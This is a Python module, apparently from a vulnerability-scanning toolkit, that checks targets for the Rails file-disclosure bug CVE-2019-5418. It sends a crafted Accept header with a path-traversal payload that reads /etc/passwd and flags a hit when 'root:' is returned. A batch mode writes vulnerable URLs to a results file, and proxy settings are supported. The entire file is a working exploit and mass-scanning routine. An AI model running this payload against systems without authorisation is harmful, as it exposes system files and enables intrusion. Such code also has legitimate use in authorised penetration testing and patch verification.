#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet

urllib3.disable_warnings()

class Cve_2019_5418:

    def run(self, urls):
        url = urls + '/robots'
        header = {
            "Host": urls.split("://")[-1],
            "Accept-Encoding": "gzip, deflate",
            "User-Agent":self.headers,
            "Accept": "../../../../../../../../etc/passwd{{"
        }
        try:
            response = requests.get(url, headers=header, verify=self.ssl, timeout=5, proxies=self.proxy)
            if "root:" in response.text:
                if not self.batch:
                    OutPrintInfoSuc("Ruby", '存在Ruby任意文件读取')
                    OutPrintInfo("Ruby", 'Payload "Accept": "../../../../../../../../etc/passwd{{"')
                    OutPrintInfo("Ruby", url)
                else:
                    OutPrintInfoSuc("Ruby", f'存在Ruby任意文件读取 {url}')
                    with open("./result/ruby_2019_5418.txt", "a") as w:
                        w.write(f"{url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("Ruby", '不存在Ruby任意文件读取')
        except Exception:
            if not self.batch:
                OutPrintInfo("Ruby", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(proxy=proxy)
            self.proxy = req["proxy"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
        if not self.batch:
            OutPrintInfo("Ruby", '开始执行Ruby任意文件读取')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Ruby", 'Ruby任意文件读取执行结束')